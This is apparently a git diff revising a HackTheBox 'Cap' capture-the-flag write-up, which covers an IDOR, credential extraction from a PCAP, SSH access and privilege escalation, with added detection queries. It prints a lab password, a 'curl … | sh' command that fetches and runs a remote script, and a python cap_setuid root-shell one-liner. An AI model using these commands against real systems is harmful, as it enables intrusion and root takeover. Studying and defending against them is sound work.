@@ -1,189 +1,193 @@
 <img width="224" height="224" alt="image" src="https://github.com/user-attachments/assets/d315b380-0621-4960-bdd5-b416c3c21c53" />
 
+> Machine Information
+> 
+> Name: Cap
+>
+> IP: 10.10.10.245
+>
+> OS: Linux (Ubuntu)
+>
+> Difficulty: Easy
 
-# Cap Writeup
+## Summary
 
-### About Cap
->Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing >network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. >The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate >to root. 
+Cap is a Linux machine running a security dashboard web application that 
+performs network captures. Improper access controls on the capture download 
+endpoint expose an IDOR vulnerability, allowing access to another user's PCAP 
+file containing plaintext FTP credentials. Those credentials are reused for SSH 
+access, and a misconfigured Linux capability on the Python binary allows for 
+trivial privilege escalation to root.
 
-## NMAP
-<br>
+**Attack Chain:** IDOR → PCAP Credential Extraction → SSH → Linux Capabilities (cap_setuid)
 
+## Enumeration
+
+### Nmap
 ```bash
 nmap -sC -sV -p- cap.htb -oN cap_nmap
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 01:06 EDT
-Nmap scan report for cap.htb (10.10.10.245)
-Host is up (0.026s latency).
-Not shown: 65532 closed tcp ports (reset)
+```
+```
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
-|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
-|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
-80/tcp open  http    Gunicorn
-|_http-server-header: gunicorn
-|_http-title: Security Dashboard
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 32.67 seconds
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
+80/tcp open  http    Gunicorn (Security Dashboard)
 ```
 
-FTP anonymous access is NOT allowed
-
+Three ports open — FTP, SSH, and an HTTP web application running Gunicorn. 
+Tested FTP for anonymous access immediately, which was denied.
 ```bash
-┌──(netcur10s㉿lab-kali)-[~]
-└─$ ftp cap.htb 
-Connected to cap.htb.
-220 (vsFTPd 3.0.3)
-Name (cap.htb:netcur10s): anonymous
-331 Please specify the password.
-Password: 
+ftp cap.htb
+Name: anonymous
 530 Login incorrect.
-ftp: Login failed
-ftp> 
-
 ```
 
-SSH password authentication allowed
+SSH accepts password authentication, which is worth noting for later once 
+credentials are obtained.
 
+### Web Application — Gobuster
+
+Ran Gobuster to enumerate directories on the web application:
 ```bash
-┌──(netcur10s㉿lab-kali)-[~]
-└─$ ssh root@cap.htb
-The authenticity of host 'cap.htb (10.10.10.245)' can't be established.
-ED25519 key fingerprint is SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added 'cap.htb' (ED25519) to the list of known hosts.
-root@cap.htb's password: 
+gobuster dir -u cap.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-## GoBuster
-
-Ran Gobuster to see if any directories of interest
-
-```bash
-┌──(netcur10s㉿lab-kali)-[~/HTB/Cap]
-└─$ gobuster dir -u cap.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                    
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://cap.htb
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/data                 (Status: 302) [Size: 208] [--> http://cap.htb/]
-/ip                   (Status: 200) [Size: 17465]
-/netstat              (Status: 200) [Size: 32741]
-/capture              (Status: 302) [Size: 222] [--> http://cap.htb/data/13]
-Progress: 220560 / 220561 (100.00%)
-===============================================================
-Finished
-===============================================================
+Results:
+```
+/data       (Status: 302) --> http://cap.htb/
+/ip         (Status: 200)
+/netstat    (Status: 200)
+/capture    (Status: 302) --> http://cap.htb/data/13
 ```
 
-Checked out the redirect address http://cap.htb/data/13 which has a download button
+The `/capture` endpoint redirected to `/data/13` — a numbered ID referencing 
+a packet capture file. This immediately suggests that other IDs may be 
+accessible.
 
-![image.png](screenshots/image.png) 
+## Initial Access
 
-Downloaded the file seems to be a pcap file 0.pcap
+### IDOR — Accessing Another User's PCAP
 
-Searching through the pcap file for any good information
+The `/data/13` endpoint contained a download button for a PCAP file. 
+Noticing the numeric ID in the URL, I tested `/data/0` — the lowest 
+possible value — which returned a different PCAP file belonging to another 
+user. This is a classic **Insecure Direct Object Reference (IDOR)** 
+vulnerability — the application uses a predictable, user-controlled ID 
+with no access control validation.
 
-Able to find user credentials
+Downloaded the file `0.pcap` and opened it in Wireshark.
 
-![image1.png](screenshots/image1.png)
+### Credential Extraction — PCAP Analysis
 
-Credentials found nathan:Buck3tH4TF0RM3!
+Analyzed the packet capture and filtered for FTP traffic. Since FTP 
+transmits credentials in plaintext, the username and password were clearly 
+visible in the packet data:
+```
+Credentials: nathan : Buck3tH4TF0RM3!
+```
 
-## FTP(21)
+### FTP Access
 
-Attempted to log into FTP under nathan and using this password Buck3tH4TF0RM3!
-
+Tested the credentials against FTP:
 ```bash
-┌──(netcur10s㉿lab-kali)-[~]
-└─$ ftp nathan@cap.htb
-Connected to cap.htb.
-220 (vsFTPd 3.0.3)
-331 Please specify the password.
-Password: 
+ftp nathan@cap.htb
 230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp> ls
-229 Entering Extended Passive Mode (|||22860|)
-150 Here comes the directory listing.
-drwxr-xr-x    3 1001     1001         4096 Aug 21 00:21 snap
--r--------    1 1001     1001           33 Aug 20 19:14 user.txt
-226 Directory send OK.
-ftp> 
 ```
 
-## SSH(22)
+Listed files in the home directory and found `user.txt`.
 
-These credential also work using SSH
+### SSH Access
 
+The same credentials worked over SSH:
+```bash
+ssh nathan@cap.htb
+```
+
+Confirmed user context:
 ```bash
 nathan@cap:~$ id
 uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
-nathan@cap:~$ 
 ```
 
-Checking to see if curl & python are installed
+Retrieved the user flag.
 
+## Privilege Escalation
+
+### Linux Capabilities — cap_setuid on Python3.8
+
+Confirmed that both `curl` and `python3` were available on the system, 
+then transferred and executed LinPEAS to enumerate privilege escalation 
+vectors:
 ```bash
-nathan@cap:~$ which curl python3
-/usr/bin/curl
-/usr/bin/python3
+curl http://10.10.14.61:80/linpeas.sh | sh
 ```
 
-Performing linpeas scan
+LinPEAS identified two findings of interest — a potential pkexec exploit 
+and a misconfigured capability on the Python binary. Checked GTFOBins 
+for the Python capability abuse technique and confirmed that 
+`/usr/bin/python3.8` had `cap_setuid` set, meaning it could arbitrarily 
+change its process UID to 0 (root) without requiring sudo.
 
+Executed the exploit:
 ```bash
-nathan@cap:~$ curl http://10.10.14.61:80/linpeas.sh | sh
+/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 ```
-
-linpeas scanned and found a potential pkexec exploit and a Python binary vulnerability.
-
-Checked GTFOBins for more information about the Python vulnerability.
-
 ```bash
-Capabilities
-
-If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.
-
-    cp $(which python) .
-    sudo setcap cap_setuid+ep python
-
-    ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
-
-```
-
-Attempted to execute > Successful!
-
-```bash
-nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 # whoami
 root
-# 
 ```
 
-Changed to root directory 
-
-Listed current directory with `ls` command and used `cat` to print out to screen
-
+Navigated to the root directory and retrieved the root flag:
 ```bash
-# cd /root
-# ls
-root.txt  snap
-# cat root.txt
+cd /root
+cat root.txt
 ```
+
+## Detection
+
+### What to Look For
+
+| Event | Detection Opportunity |
+|-------|----------------------|
+| Sequential ID enumeration on `/data/` endpoint | Web server logs showing rapid requests to `/data/0`, `/data/1`, etc. from a single IP |
+| FTP plaintext credential exposure | Network monitoring for FTP AUTH traffic — any FTP session on an untrusted network should alert |
+| Python capability abuse | Process auditing for `python` spawning `/bin/sh` as UID 0 |
+
+### Splunk Detection — IDOR Enumeration
+```
+index=web_logs uri_path="/data/*"
+| rex field=uri_path "/data/(?<capture_id>\d+)"
+| stats count by src_ip, capture_id
+| where count > 3
+| sort -count
+```
+
+## Key Takeaways
+
+- **IDOR is a simple but devastating vulnerability** — any endpoint that 
+  uses a predictable numeric ID to reference resources must enforce 
+  ownership validation server-side. The fix here is a single access 
+  control check confirming the requesting user owns the requested capture.
+- **FTP should not be used to transmit credentials** — FTP sends all 
+  data including usernames and passwords in cleartext. Any attacker 
+  with the ability to capture network traffic on the same segment can 
+  trivially extract credentials. SFTP or SCP should be used instead.
+- **Linux capabilities are as dangerous as SUID bits** — `cap_setuid` 
+  on an interpreter like Python effectively grants root access to anyone 
+  who can execute it. Capabilities should be audited regularly using 
+  `getcap -r / 2>/dev/null` and removed unless explicitly required.
+
+## Tools Used
+
+- Nmap
+- Gobuster
+- Wireshark
+- LinPEAS
+- FTP / SSH clients
+
+## References
+
+- [MITRE ATT&CK - IDOR / Forced Browsing T1083](https://attack.mitre.org/techniques/T1083/)
+- [MITRE ATT&CK - Credentials in Network Traffic T1040](https://attack.mitre.org/techniques/T1040/)
+- [MITRE ATT&CK - Linux Capabilities Abuse T1548.001](https://attack.mitre.org/techniques/T1548.001/)
+- [GTFOBins - Python Capabilities](https://gtfobins.github.io/gtfobins/python/)
